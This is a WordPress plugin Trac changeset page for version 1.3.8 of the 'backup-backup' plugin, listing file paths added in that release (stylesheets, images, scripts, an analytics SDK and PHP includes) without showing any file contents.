=== Content from plugins.trac.wordpress.org_209cdaf2_20250114_212958.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%3Fnew%3D3006541%2540backup-backup%26old%3D3006541%2540backup-backup)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Change](/changeset/3003840/backup-backup "Changeset 3003840 for backup-backup")
* [Next Change](/changeset/3010013/backup-backup "Changeset 3010013 for backup-backup") →

---

# Changeset [3006541](/changeset/3006541 "Show full changeset") for [backup-backup](/browser/backup-backup?rev=3006541 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
12/07/2023 03:21:24 AM
([13 months](/timeline?from=2023-12-07T03%3A21%3A24Z&precision=second "See timeline at 12/07/2023 03:21:24 AM") ago)

Author:
iclyde
Message:

Version 1.3.8

Location:
[backup-backup](/browser/backup-backup?rev=3006541)
Files:

386 added
1 edited

* [tags/1.3.8](/browser/backup-backup/tags/1.3.8?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin](/browser/backup-backup/tags/1.3.8/admin?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/css](/browser/backup-backup/tags/1.3.8/admin/css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/css/bmi-plugin-icon.min.css](/browser/backup-backup/tags/1.3.8/admin/css/bmi-plugin-icon.min.css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/css/bmi-plugin.min.css](/browser/backup-backup/tags/1.3.8/admin/css/bmi-plugin.min.css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images](/browser/backup-backup/tags/1.3.8/admin/images?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/002-monitor-white.svg](/browser/backup-backup/tags/1.3.8/admin/images/002-monitor-white.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/Amazon.svg](/browser/backup-backup/tags/1.3.8/admin/images/Amazon.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/alert\_error-min.png](/browser/backup-backup/tags/1.3.8/admin/images/alert_error-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/alert\_info-min.png](/browser/backup-backup/tags/1.3.8/admin/images/alert_info-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/alert\_success-min.png](/browser/backup-backup/tags/1.3.8/admin/images/alert_success-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/alert\_warning-min.png](/browser/backup-backup/tags/1.3.8/admin/images/alert_warning-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/arrow-min.png](/browser/backup-backup/tags/1.3.8/admin/images/arrow-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/backblaze.svg](/browser/backup-backup/tags/1.3.8/admin/images/backblaze.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/backup-min.svg](/browser/backup-backup/tags/1.3.8/admin/images/backup-min.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/big-thumb-up.svg](/browser/backup-backup/tags/1.3.8/admin/images/big-thumb-up.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/big\_bg\_clock\_green-min.png](/browser/backup-backup/tags/1.3.8/admin/images/big_bg_clock_green-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/big\_bg\_clock\_white-min.png](/browser/backup-backup/tags/1.3.8/admin/images/big_bg_clock_white-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/clock.svg](/browser/backup-backup/tags/1.3.8/admin/images/clock.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/clock2.svg](/browser/backup-backup/tags/1.3.8/admin/images/clock2.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/clocks-min.png](/browser/backup-backup/tags/1.3.8/admin/images/clocks-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/close-min.png](/browser/backup-backup/tags/1.3.8/admin/images/close-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/copy-icon.png](/browser/backup-backup/tags/1.3.8/admin/images/copy-icon.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/copy-url-stg.svg](/browser/backup-backup/tags/1.3.8/admin/images/copy-url-stg.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/crown-bg.png](/browser/backup-backup/tags/1.3.8/admin/images/crown-bg.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/download-min.png](/browser/backup-backup/tags/1.3.8/admin/images/download-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/dream-objects.svg](/browser/backup-backup/tags/1.3.8/admin/images/dream-objects.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/ftp.svg](/browser/backup-backup/tags/1.3.8/admin/images/ftp.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/google-cloud.svg](/browser/backup-backup/tags/1.3.8/admin/images/google-cloud.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/google-drive-mono.svg](/browser/backup-backup/tags/1.3.8/admin/images/google-drive-mono.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/google-drive.svg](/browser/backup-backup/tags/1.3.8/admin/images/google-drive.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/happy-smile.png](/browser/backup-backup/tags/1.3.8/admin/images/happy-smile.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/info-min.png](/browser/backup-backup/tags/1.3.8/admin/images/info-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/kitty-cat.svg](/browser/backup-backup/tags/1.3.8/admin/images/kitty-cat.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/link-min.png](/browser/backup-backup/tags/1.3.8/admin/images/link-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/list-ongoing.svg](/browser/backup-backup/tags/1.3.8/admin/images/list-ongoing.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/list-success.svg](/browser/backup-backup/tags/1.3.8/admin/images/list-success.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/list-waiting.svg](/browser/backup-backup/tags/1.3.8/admin/images/list-waiting.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/list-warning.svg](/browser/backup-backup/tags/1.3.8/admin/images/list-warning.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/local-server-2.svg](/browser/backup-backup/tags/1.3.8/admin/images/local-server-2.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/local-server.svg](/browser/backup-backup/tags/1.3.8/admin/images/local-server.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/lock-experimental.png](/browser/backup-backup/tags/1.3.8/admin/images/lock-experimental.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/lock-min.svg](/browser/backup-backup/tags/1.3.8/admin/images/lock-min.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/log-in.svg](/browser/backup-backup/tags/1.3.8/admin/images/log-in.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/log-min.svg](/browser/backup-backup/tags/1.3.8/admin/images/log-min.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/logo-min.png](/browser/backup-backup/tags/1.3.8/admin/images/logo-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/logo.png](/browser/backup-backup/tags/1.3.8/admin/images/logo.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/microsoft-azure.svg](/browser/backup-backup/tags/1.3.8/admin/images/microsoft-azure.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/minimize-min.png](/browser/backup-backup/tags/1.3.8/admin/images/minimize-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/next-icon-min.png](/browser/backup-backup/tags/1.3.8/admin/images/next-icon-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/nut-big.png](/browser/backup-backup/tags/1.3.8/admin/images/nut-big.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/nut-mid.png](/browser/backup-backup/tags/1.3.8/admin/images/nut-mid.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/nut-small.png](/browser/backup-backup/tags/1.3.8/admin/images/nut-small.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/onedrive.svg](/browser/backup-backup/tags/1.3.8/admin/images/onedrive.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/openstack-swift.svg](/browser/backup-backup/tags/1.3.8/admin/images/openstack-swift.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/pen-edit.svg](/browser/backup-backup/tags/1.3.8/admin/images/pen-edit.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/premium.png](/browser/backup-backup/tags/1.3.8/admin/images/premium.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/premium.svg](/browser/backup-backup/tags/1.3.8/admin/images/premium.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/rackspace.svg](/browser/backup-backup/tags/1.3.8/admin/images/rackspace.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/red-close-min.svg](/browser/backup-backup/tags/1.3.8/admin/images/red-close-min.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/red-cross.svg](/browser/backup-backup/tags/1.3.8/admin/images/red-cross.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/restore-icon-min.png](/browser/backup-backup/tags/1.3.8/admin/images/restore-icon-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/restore-min.svg](/browser/backup-backup/tags/1.3.8/admin/images/restore-min.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/search-min.png](/browser/backup-backup/tags/1.3.8/admin/images/search-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/sftp-scp.svg](/browser/backup-backup/tags/1.3.8/admin/images/sftp-scp.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/stars.gif](/browser/backup-backup/tags/1.3.8/admin/images/stars.gif?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/stg-bg.svg](/browser/backup-backup/tags/1.3.8/admin/images/stg-bg.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/stg-check.svg](/browser/backup-backup/tags/1.3.8/admin/images/stg-check.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/stg-creation-bg.jpg](/browser/backup-backup/tags/1.3.8/admin/images/stg-creation-bg.jpg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/stg-new.svg](/browser/backup-backup/tags/1.3.8/admin/images/stg-new.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/stg-restore-btn.svg](/browser/backup-backup/tags/1.3.8/admin/images/stg-restore-btn.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/success.png](/browser/backup-backup/tags/1.3.8/admin/images/success.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/support-1.svg](/browser/backup-backup/tags/1.3.8/admin/images/support-1.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/support-2.svg](/browser/backup-backup/tags/1.3.8/admin/images/support-2.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/support-3.svg](/browser/backup-backup/tags/1.3.8/admin/images/support-3.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/thumb.png](/browser/backup-backup/tags/1.3.8/admin/images/thumb.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/timemachine.svg](/browser/backup-backup/tags/1.3.8/admin/images/timemachine.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/tlogo.svg](/browser/backup-backup/tags/1.3.8/admin/images/tlogo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/trash.png](/browser/backup-backup/tags/1.3.8/admin/images/trash.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/unlocked-min.svg](/browser/backup-backup/tags/1.3.8/admin/images/unlocked-min.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/upload-min.png](/browser/backup-backup/tags/1.3.8/admin/images/upload-min.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/upload.svg](/browser/backup-backup/tags/1.3.8/admin/images/upload.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/warning-grey.png](/browser/backup-backup/tags/1.3.8/admin/images/warning-grey.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/warning-red.png](/browser/backup-backup/tags/1.3.8/admin/images/warning-red.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/images/x-face.png](/browser/backup-backup/tags/1.3.8/admin/images/x-face.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/js](/browser/backup-backup/tags/1.3.8/admin/js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/admin/js/backup-migration.min.js](/browser/backup-backup/tags/1.3.8/admin/js/backup-migration.min.js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst](/browser/backup-backup/tags/1.3.8/analyst?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets](/browser/backup-backup/tags/1.3.8/analyst/assets?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/css](/browser/backup-backup/tags/1.3.8/analyst/assets/css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/css/customize.css](/browser/backup-backup/tags/1.3.8/analyst/assets/css/customize.css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/img](/browser/backup-backup/tags/1.3.8/analyst/assets/img?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/img/pencil.png](/browser/backup-backup/tags/1.3.8/analyst/assets/img/pencil.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/img/shield\_question.png](/browser/backup-backup/tags/1.3.8/analyst/assets/img/shield_question.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/img/shield\_success.png](/browser/backup-backup/tags/1.3.8/analyst/assets/img/shield_success.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/img/smile.png](/browser/backup-backup/tags/1.3.8/analyst/assets/img/smile.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/index.php](/browser/backup-backup/tags/1.3.8/analyst/assets/index.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/js](/browser/backup-backup/tags/1.3.8/analyst/assets/js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/assets/js/customize.js](/browser/backup-backup/tags/1.3.8/analyst/assets/js/customize.js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/autoload.php](/browser/backup-backup/tags/1.3.8/analyst/autoload.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/index.php](/browser/backup-backup/tags/1.3.8/analyst/index.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/main.php](/browser/backup-backup/tags/1.3.8/analyst/main.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/sdk\_resolver.php](/browser/backup-backup/tags/1.3.8/analyst/sdk_resolver.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src](/browser/backup-backup/tags/1.3.8/analyst/src?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Account](/browser/backup-backup/tags/1.3.8/analyst/src/Account?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Account/Account.php](/browser/backup-backup/tags/1.3.8/analyst/src/Account/Account.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Account/AccountData.php](/browser/backup-backup/tags/1.3.8/analyst/src/Account/AccountData.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Account/AccountDataFactory.php](/browser/backup-backup/tags/1.3.8/analyst/src/Account/AccountDataFactory.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Analyst.php](/browser/backup-backup/tags/1.3.8/analyst/src/Analyst.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/ApiRequestor.php](/browser/backup-backup/tags/1.3.8/analyst/src/ApiRequestor.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/ApiResponse.php](/browser/backup-backup/tags/1.3.8/analyst/src/ApiResponse.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Cache](/browser/backup-backup/tags/1.3.8/analyst/src/Cache?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Cache/DatabaseCache.php](/browser/backup-backup/tags/1.3.8/analyst/src/Cache/DatabaseCache.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Collector.php](/browser/backup-backup/tags/1.3.8/analyst/src/Collector.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Contracts](/browser/backup-backup/tags/1.3.8/analyst/src/Contracts?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Contracts/AnalystContract.php](/browser/backup-backup/tags/1.3.8/analyst/src/Contracts/AnalystContract.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Contracts/CacheContract.php](/browser/backup-backup/tags/1.3.8/analyst/src/Contracts/CacheContract.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Contracts/HttpClientContract.php](/browser/backup-backup/tags/1.3.8/analyst/src/Contracts/HttpClientContract.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Contracts/RequestContract.php](/browser/backup-backup/tags/1.3.8/analyst/src/Contracts/RequestContract.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Contracts/RequestorContract.php](/browser/backup-backup/tags/1.3.8/analyst/src/Contracts/RequestorContract.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Contracts/TrackerContract.php](/browser/backup-backup/tags/1.3.8/analyst/src/Contracts/TrackerContract.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Core](/browser/backup-backup/tags/1.3.8/analyst/src/Core?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Core/AbstractFactory.php](/browser/backup-backup/tags/1.3.8/analyst/src/Core/AbstractFactory.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http](/browser/backup-backup/tags/1.3.8/analyst/src/Http?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/CurlHttpClient.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/CurlHttpClient.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/DummyHttpClient.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/DummyHttpClient.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/Requests](/browser/backup-backup/tags/1.3.8/analyst/src/Http/Requests?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/Requests/AbstractLoggerRequest.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/Requests/AbstractLoggerRequest.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/Requests/ActivateRequest.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/Requests/ActivateRequest.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/Requests/DeactivateRequest.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/Requests/DeactivateRequest.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/Requests/InstallRequest.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/Requests/InstallRequest.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/Requests/OptInRequest.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/Requests/OptInRequest.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/Requests/OptOutRequest.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/Requests/OptOutRequest.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/Requests/UninstallRequest.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/Requests/UninstallRequest.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Http/WordPressHttpClient.php](/browser/backup-backup/tags/1.3.8/analyst/src/Http/WordPressHttpClient.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Mutator.php](/browser/backup-backup/tags/1.3.8/analyst/src/Mutator.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Notices](/browser/backup-backup/tags/1.3.8/analyst/src/Notices?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Notices/Notice.php](/browser/backup-backup/tags/1.3.8/analyst/src/Notices/Notice.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/Notices/NoticeFactory.php](/browser/backup-backup/tags/1.3.8/analyst/src/Notices/NoticeFactory.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/src/helpers.php](/browser/backup-backup/tags/1.3.8/analyst/src/helpers.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/templates](/browser/backup-backup/tags/1.3.8/analyst/templates?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/templates/forms](/browser/backup-backup/tags/1.3.8/analyst/templates/forms?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/templates/forms/deactivate.php](/browser/backup-backup/tags/1.3.8/analyst/templates/forms/deactivate.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/templates/forms/install.php](/browser/backup-backup/tags/1.3.8/analyst/templates/forms/install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/templates/notice.php](/browser/backup-backup/tags/1.3.8/analyst/templates/notice.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/templates/optin.php](/browser/backup-backup/tags/1.3.8/analyst/templates/optin.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/templates/optout.php](/browser/backup-backup/tags/1.3.8/analyst/templates/optout.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/analyst/version.php](/browser/backup-backup/tags/1.3.8/analyst/version.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/backup-backup.php](/browser/backup-backup/tags/1.3.8/backup-backup.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes](/browser/backup-backup/tags/1.3.8/includes?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/.htaccess](/browser/backup-backup/tags/1.3.8/includes/.htaccess?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/activation.php](/browser/backup-backup/tags/1.3.8/includes/activation.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/ajax.php](/browser/backup-backup/tags/1.3.8/includes/ajax.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/analyst.php](/browser/backup-backup/tags/1.3.8/includes/analyst.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/backup-heart.php](/browser/backup-backup/tags/1.3.8/includes/backup-heart.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner](/browser/backup-backup/tags/1.3.8/includes/banner?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/assets](/browser/backup-backup/tags/1.3.8/includes/banner/assets?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/assets/index.min.js](/browser/backup-backup/tags/1.3.8/includes/banner/assets/index.min.js?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/assets/style.min.css](/browser/backup-backup/tags/1.3.8/includes/banner/assets/style.min.css?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/misc.php](/browser/backup-backup/tags/1.3.8/includes/banner/misc.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views](/browser/backup-backup/tags/1.3.8/includes/banner/views?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/index.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/index.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi/imgs](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi/imgs/background-images.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/imgs/background-images.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi/imgs/background-texture-grey.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/imgs/background-texture-grey.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi/imgs/big-colored-logo.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/imgs/big-colored-logo.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi/imgs/colored-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/imgs/colored-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi/imgs/white-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/imgs/white-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi/install.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/bmi/installed.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/installed.php?rev=3006541 "Show entry in browser")
  (added)
